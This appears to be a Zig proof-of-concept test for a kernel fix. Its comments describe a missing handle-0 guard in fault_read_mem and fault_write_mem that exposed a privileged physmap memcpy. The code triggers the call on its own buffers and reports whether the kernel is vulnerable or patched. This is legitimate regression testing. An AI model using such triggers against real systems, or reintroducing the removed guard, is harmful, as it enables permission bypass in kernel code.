// PoC for 1d06797: fault.zig sysFaultReadMem/sysFaultWriteMem missing
// HANDLE_SELF (handle == 0) guard.
//
// The full commit "fix: restore acquireThreadRef and HANDLE_SELF guard
// in fault.zig" restores three guards that a vaddr-bounds cherry-pick
// had overwritten:
//
//   1. sysFaultReadMem:  if (proc_handle == 0) return E_PERM;
//   2. sysFaultWriteMem: if (proc_handle == 0) return E_PERM;
//   3. sysFaultSetThreadMode: switch from getPermByHandle to
//      acquireThreadRef pinning (Cap-F2 TOCTOU UAF refcount fix).
//
// The HANDLE_SELF guard (#1, #2) is the cleanest, deterministic
// differential and is what this PoC exercises.
//
// Pre-patch behavior (vulnerable): proc_handle = 0 falls through to
// proc.getPermByHandle(0). Slot 0 of every process's perm_table holds
// the self-process entry with handle == HANDLE_SELF (== 0). For the
// root_service that handle carries every right, including
// fault_handler. The kernel therefore happily executes a fault-debug
// memcpy from the caller's own address space into the caller's own
// buffer via the kernel physmap, returning E_OK. This is a privileged
// debug primitive (raw paddr resolve + ring-0 memcpy bypassing page
// permissions) being unintentionally exposed against self.
//
// Post-patch behavior (patched): the explicit `if (proc_handle == 0)
// return E_PERM` short-circuits before any debug machinery runs.
//
// Differential:
//   ret == E_OK   (0)  -> VULNERABLE
//   ret == E_PERM (-2) -> PATCHED

const lib = @import("lib");
const syscall = lib.syscall;

var src_buf: [16]u8 = .{
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
};
var dst_buf: [16]u8 = .{0} ** 16;

pub fn main(_: u64) void {
    // proc_handle = 0 (HANDLE_SELF). Pre-patch: hits self-process
    // entry, fault_handler bit set, succeeds. Post-patch: E_PERM.
    const ret = syscall.fault_read_mem(
        0,
        @intFromPtr(&src_buf),
        @intFromPtr(&dst_buf),
        src_buf.len,
    );

    if (ret == syscall.E_PERM) {
        syscall.write("POC-1d06797: PATCHED (fault_read_mem handle=0 -> E_PERM)\n");
    } else if (ret == syscall.E_OK) {
        // Sanity-check the bytes actually moved through the kernel
        // physmap path; if they did, the debug primitive ran on self.
        var matched = true;
        var i: usize = 0;
        while (i < src_buf.len) {
            if (dst_buf[i] != src_buf[i]) {
                matched = false;
                break;
            }
            i += 1;
        }
        if (matched) {
            syscall.write("POC-1d06797: VULNERABLE (fault_read_mem handle=0 -> E_OK, bytes copied)\n");
        } else {
            syscall.write("POC-1d06797: VULNERABLE (fault_read_mem handle=0 -> E_OK, but bytes diverged)\n");
        }
    } else {
        syscall.write("POC-1d06797: UNEXPECTED\n");
    }

    syscall.shutdown();
}
